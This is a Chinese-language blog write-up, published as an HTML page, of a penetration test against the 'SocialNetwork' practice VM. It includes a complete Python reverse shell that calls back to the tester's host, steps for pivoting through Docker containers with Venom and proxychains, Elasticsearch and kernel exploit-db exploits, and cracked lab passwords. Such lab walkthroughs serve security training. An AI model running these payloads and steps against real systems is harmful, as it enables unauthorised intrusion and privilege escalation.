@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>打靶-SocialNetwork - Hannibal0x の Blog</title><meta name="Description" content="Hannibal0x的个人学习博客"><meta property="og:title" content="打靶-SocialNetwork" />
+<meta property="og:description" content="0x00 准备工作 中等难度的靶机，Description如下： 1 Leave a message is a new anonymous social networking site where users can post messages for each other. They&#39;ve assigned you to test their set up. They do utilize docker containers. You can conduct attacks against those too. Try to see if" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://hannibal0x.github.io/2021-10-09-%E6%89%93%E9%9D%B6-socialnetwork/" /><meta property="og:image" content="https://hannibal0x.github.io/images/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-10-09T14:16:04+00:00" />
+<meta property="article:modified_time" content="2021-10-09T14:16:04+00:00" /><meta property="og:site_name" content="Hannibal0x の Blog" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://hannibal0x.github.io/images/logo.png"/>
+
+<meta name="twitter:title" content="打靶-SocialNetwork"/>
+<meta name="twitter:description" content="0x00 准备工作 中等难度的靶机，Description如下： 1 Leave a message is a new anonymous social networking site where users can post messages for each other. They&#39;ve assigned you to test their set up. They do utilize docker containers. You can conduct attacks against those too. Try to see if"/>
+<meta name="application-name" content="Hannibal0x の Blog">
+<meta name="apple-mobile-web-app-title" content="Hannibal0x の Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/images/logo.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://hannibal0x.github.io/2021-10-09-%E6%89%93%E9%9D%B6-socialnetwork/" /><link rel="prev" href="https://hannibal0x.github.io/2021-10-08-2021%E9%A6%96%E5%B1%8A%E9%B9%A4%E5%9F%8E%E6%9D%AFwriteupmisccrypto/" /><link rel="next" href="https://hannibal0x.github.io/2021-10-10-%E6%89%93%E9%9D%B6-cloudav/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "打靶-SocialNetwork",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/hannibal0x.github.io\/2021-10-09-%E6%89%93%E9%9D%B6-socialnetwork\/"
+        },"genre": "posts","keywords": "渗透测试, Web安全","wordcount":  1541 ,
+        "url": "https:\/\/hannibal0x.github.io\/2021-10-09-%E6%89%93%E9%9D%B6-socialnetwork\/","datePublished": "2021-10-09T14:16:04+00:00","dateModified": "2021-10-09T14:16:04+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Hannibal0x"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Hannibal0x の Blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/logo.png"
+        data-srcset="/images/logo.png, /images/logo.png 1.5x, /images/logo.png 2x"
+        data-sizes="auto"
+        alt="/images/logo.png"
+        title="/images/logo.png" width="32" height="32" />Hannibal0x の Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"><i class='fas fa-book'></i> 文章 </a><a class="menu-item" href="/tags/"><i class='fas fa-tags'></i> 标签 </a><a class="menu-item" href="/categories/"><i class='fas fa-folder'></i> 分类 </a><a class="menu-item" href="/categories/writeup"><i class='fas fa-flag'></i> CTF </a><a class="menu-item" href="/about/"><i class='fas fa-key'></i> 关于 </a><a class="menu-item" href="http://hannibal0x.top" rel="noopener noreffer" target="_blank"><i class='fas fa-history'></i> 旧博客 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="都几岁啦，还这么害羞，让我康康！" id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Hannibal0x の Blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/logo.png"
+        data-srcset="/images/logo.png, /images/logo.png 1.5x, /images/logo.png 2x"
+        data-sizes="auto"
+        alt="/images/logo.png"
+        title="/images/logo.png" width="32" height="32" />Hannibal0x の Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="都几岁啦，还这么害羞，让我康康！" id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title=""><i class='fas fa-book'></i>文章</a><a class="menu-item" href="/tags/" title=""><i class='fas fa-tags'></i>标签</a><a class="menu-item" href="/categories/" title=""><i class='fas fa-folder'></i>分类</a><a class="menu-item" href="/categories/writeup" title=""><i class='fas fa-flag'></i>CTF</a><a class="menu-item" href="/about/" title=""><i class='fas fa-key'></i>关于</a><a class="menu-item" href="http://hannibal0x.top" title="" rel="noopener noreffer" target="_blank"><i class='fas fa-history'></i>旧博客</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">打靶-SocialNetwork</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Hannibal0x</a></span>&nbsp;<span class="post-category">included in <a href="/categories/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>安全技术</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2021-10-09">2021-10-09</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1541 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;4 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#0x00-准备工作">0x00 准备工作</a></li>
+    <li><a href="#0x01-正式打靶">0x01 正式打靶</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><div class="has-toc have-toc">
+</div>
+<h2 id="0x00-准备工作">0x00 准备工作</h2>
+<p>中等难度的靶机，Description如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Leave a message is a new anonymous social networking site where users can post messages for each other. They&#39;ve assigned you to test their set up. They do utilize docker containers. You can conduct attacks against those too. Try to see if you can get root on the host though.
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>直接装在vmware上即可。</p>
+<h2 id="0x01-正式打靶">0x01 正式打靶</h2>
+<p>上nmap扫描主机的端口，发现开放了22和5000。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1475" height="456" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-15.png" alt="" class="wp-image-3957" /> </figure></p>
+<p>再深入扫描一下服务，发现5000端口使用了Werkzeug。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1914" height="571" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-16.png" alt="" class="wp-image-3958" /> </figure></p>
+<p>baidu一下，发现Werkzeug是作为一个Python Web框架的底层库。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1693" height="174" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-17.png" alt="" class="wp-image-3959" /> </figure></p>
+<p>访问下5000端口，发现存在一个留言板。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="2269" height="656" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-18.png" alt="" class="wp-image-3960" /> </figure></p>
+<p>使用dirsearch来进行路径发现，发现存在一个隐藏的admin路径，接下来访问它。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1784" height="584" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-19.png" alt="" class="wp-image-3961" /> </figure></p>
+<p>好家伙，这个页面可以直接进行代码执行。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1688" height="788" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-20.png" alt="" class="wp-image-3962" /> </figure></p>
+<p>这里插一个小细节，之前扫描出web服务的编程语言是python，所以这里可以通过python的代码执行来反弹shell。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1852" height="220" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-21.png" alt="" class="wp-image-3963" /> </figure></p>
+<p>应用的代码如下：</p>
+<pre class="wp-block-code"><code>import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("192.168.92.129",2333))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p=subprocess.call(&#91;"/bin/bash","-i"])</code></pre>
+<p>本地开2333端口侦听，执行id命令后，能看到是root用户，不过当前目录下的dockerfile很可疑，可能进入的系统是docker容器的系统。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1916" height="458" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-22.png" alt="" class="wp-image-3964" /> </figure></p>
+<p>确定进入的系统是否为docker系统的方法：</p>
+<ol>
+<li><code>ls /.dockerenv</code>，查看根目录下是否存在有.dockerenv文件</li>
+<li><code>cat /proc/1/cgroup</code> ，1代表初始化进程的id，当它的cgroup文件中包含docker文件的映像信息和哈希值，就100%确定工作在docker环境<figure class="wp-block-image size-full"></li>
+</ol>
+<p><img loading="lazy" width="2028" height="532" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-23.png" alt="" class="wp-image-3965" /> </figure></p>
+<p>查看当前ip，然后在内网进行主机发现，当前172.17.0.2/16是b段，全部ping的话，主机数目过多。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1714" height="368" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-25.png" alt="" class="wp-image-3967" /> </figure></p>
+<p>这里利用一个小脚本<code>for i in $(seq 1 10); do ping -c 1 172.17.0.$i; done</code>，可以看到1-3主机是存活的。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1347" height="1292" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-26.png" alt="" class="wp-image-3968" /> </figure></p>
+<p>然后使用Venom工具，<code>./admin_linux_x64 -lport 8888</code>，侦听8888端口，再用<code>python3 -m http.server 80</code>开启web服务，用靶机wget下载agent_linux_x64。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1835" height="647" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-27.png" alt="" class="wp-image-3969" /> </figure></p>
+<p>kali上面会得到结点响应，再开启socks5代理。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1373" height="729" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-28.png" alt="" class="wp-image-3970" /> </figure></p>
+<p>使用<code>proxychains nmap -sT -Pn 172.17.0.1</code>,扫描172.17.0.1的端口。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1149" height="521" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-29.png" alt="" class="wp-image-3971" /> </figure></p>
+<p>再次详细扫描<code>proxychains nmap -p22,5000 -sV -sT -Pn 172.17.0.1</code>，不能说是一模一样，只能说是完全一致。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1791" height="426" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-30.png" alt="" class="wp-image-3972" /> </figure></p>
+<p>然后在浏览器部署代理后访问页面。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1099" height="312" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-31.png" alt="" class="wp-image-3973" /> </figure></p>
+<p>似曾相识燕归来，根据他们相同的内容，可以做出判断，这所谓的两台主机其实是同一台主机，只不过一个对应内网ip，一个对应外网ip。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1531" height="542" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-32.png" alt="" class="wp-image-3974" /> </figure></p>
+<p>好了，下面就朝着172.17.0.3猛攻，扫描它的端口。<figure class="wp-block-image size-full is-resized"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-33.png" alt="" class="wp-image-3976" width="471" height="149" /> </figure></p>
+<p>开启了9200端口，在详细扫描一下，可以发现是Elasticsearch服务。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="2024" height="769" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-34.png" alt="" class="wp-image-3977" /> </figure></p>
+<p>web访问，得到版本信息。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1397" height="674" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-35.png" alt="" class="wp-image-3978" /> </figure></p>
+<p>利用<code>searchsploit elasticsearch</code>找一下历史漏洞。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="2201" height="524" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-36.png" alt="" class="wp-image-3979" /> </figure></p>
+<p>使用<code>cp /usr/share/exploitdb/exploits/linux/remote/36337.py .</code>拷贝到当前目录下，简单查看下代码。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1811" height="665" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-37.png" alt="" class="wp-image-3981" /> </figure></p>
+<p>使用<code>proxychains python2 36337.py 172.17.0.3</code>来getshell，发现获取到的还是root权限。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1868" height="508" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-38.png" alt="" class="wp-image-3982" /> </figure></p>
+<p>在当前目录查看，发现一个passwords文件，查看一下。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1225" height="966" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-39.png" alt="" class="wp-image-3983" /> </figure></p>
+<p>文件的格式貌似是用户名和密码的哈希值，在线解密汇总。</p>
+<pre class="wp-block-code"><code>john:1337hack
+test:1234test
+admin:1111pass
+root:1234pass
+jane:1234jane</code></pre>
+<p>经过尝试ssh连接，只有john用户可以登录到192.168.92.134上。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1537" height="888" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-40.png" alt="" class="wp-image-3985" /> </figure></p>
+<p>查看john的权限，发现并不能够直接sudo。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1239" height="103" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-41.png" alt="" class="wp-image-3986" /> </figure></p>
+<p>下面尝试本地提权，最主要的一种方法是通过内核漏洞提权，查看下当前的版本。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1997" height="73" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-42.png" alt="" class="wp-image-3987" /> </figure></p>
+<p>再利用searchsploit查找下。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="2070" height="304" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-43.png" alt="" class="wp-image-3988" /> </figure></p>
+<p>拷贝到当前目录，<code>cp /usr/share/exploitdb/exploits/linux/local/37292.c .</code>，这个明显是c语言写的，但是靶机上运行不了gcc，无法编译。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="2209" height="73" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-44.png" alt="" class="wp-image-3989" /> </figure></p>
+<p>阅读代码发现，代码运行中会再次调用gcc命令将.c文件编译成.so文件。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1478" height="541" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-45.png" alt="" class="wp-image-3990" /> </figure></p>
+<p>对源代码进行修改，删除掉143-147行内容。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="2818" height="299" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-46.png" alt="" class="wp-image-3991" /> </figure></p>
+<p>使用<code>gcc -o exp 37292.c</code>进行编译，编译过程中会报错，但是并不影响。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="2268" height="553" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-47.png" alt="" class="wp-image-3992" /> </figure></p>
+<p>使用locate命令用于查找符合条件的文件，同样拷贝到当前目录下，再用python启动web服务。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="2272" height="210" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-48.png" alt="" class="wp-image-3993" /> </figure></p>
+<p>用靶机wget下载exp和ofs-lib.so。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1204" height="811" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-49.png" alt="" class="wp-image-3994" /> </figure></p>
+<p>然后把两个文件移到tmp文件夹，再修改exp的权限后执行。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="594" height="509" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-50.png" alt="" class="wp-image-3995" /> </figure></p>
+<p>最后，提权成功！<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="946" height="134" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-51.png" alt="" class="wp-image-3996" /> </figure></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2021-10-09</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/2021-10-09-%E6%89%93%E9%9D%B6-socialnetwork/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://hannibal0x.github.io/2021-10-09-%E6%89%93%E9%9D%B6-socialnetwork/" data-title="打靶-SocialNetwork" data-hashtags="渗透测试,Web安全"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://hannibal0x.github.io/2021-10-09-%E6%89%93%E9%9D%B6-socialnetwork/" data-hashtag="渗透测试"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://hannibal0x.github.io/2021-10-09-%E6%89%93%E9%9D%B6-socialnetwork/" data-title="打靶-SocialNetwork"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://hannibal0x.github.io/2021-10-09-%E6%89%93%E9%9D%B6-socialnetwork/" data-title="打靶-SocialNetwork"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://hannibal0x.github.io/2021-10-09-%E6%89%93%E9%9D%B6-socialnetwork/" data-title="打靶-SocialNetwork"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>,&nbsp;<a href="/tags/web%E5%AE%89%E5%85%A8/">Web安全</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/2021-10-08-2021%E9%A6%96%E5%B1%8A%E9%B9%A4%E5%9F%8E%E6%9D%AFwriteupmisccrypto/" class="prev" rel="prev" title="2021首届鹤城杯WriteUp（MISC&#43;CRYPTO）"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>2021首届鹤城杯WriteUp（MISC+CRYPTO）</a>
+            <a href="/2021-10-10-%E6%89%93%E9%9D%B6-cloudav/" class="next" rel="next" title="打靶-CloudAV">打靶-CloudAV<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+<div id="comments"><div id="utterances" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://utteranc.es/">utterances</a>.
+            </noscript></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.101.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Hannibal0x</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/algoliasearch/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{"utterances":{"darkTheme":"github-dark","issueTerm":"pathname","label":"","lightTheme":"github-light","repo":"Hannibal0x/blog-comment"}},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"algoliaAppID":"LBWAPJR4IC","algoliaIndex":"blog","algoliaSearchKey":"3771060ae26cbca6e13551298e854580","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
